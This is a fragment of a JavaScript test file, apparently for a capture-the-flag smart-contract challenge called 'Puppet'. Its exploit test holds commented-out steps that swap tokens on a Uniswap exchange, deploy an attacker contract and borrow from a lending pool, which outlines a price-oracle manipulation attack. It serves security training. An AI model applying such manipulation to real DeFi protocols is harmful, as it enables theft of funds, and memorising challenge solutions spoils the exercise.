...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        //await this.uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, ethers.utils.parseEther('1'), (await ethers.provider.getBlock('latest')).timestamp * 2);

        // const AttackerContractFactory = await ethers.getContractFactory('AttackerPuppet', attacker);
        // this.attacker = await AttackerContractFactory.deploy(this.lendingPool.address);

        // await this.attacker.connect(attacker).attack(attacker.balance);

        //await this.lendingPool.connect(attacker).borrow(100000, {value: ethers.provider.getBalance(attacker)});
